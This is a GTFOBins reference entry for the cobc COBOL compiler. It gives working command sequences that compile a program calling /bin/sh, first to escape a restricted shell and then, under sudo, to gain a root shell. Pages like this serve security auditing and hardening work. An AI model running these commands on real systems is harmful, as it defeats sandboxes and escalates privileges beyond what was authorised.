# GTFOBin: cobc

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
TF=$(mktemp -d)
echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
cobc -xFj --frelax-syntax-checks $TF/x
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
TF=$(mktemp -d)
echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
sudo cobc -xFj --frelax-syntax-checks $TF/x
```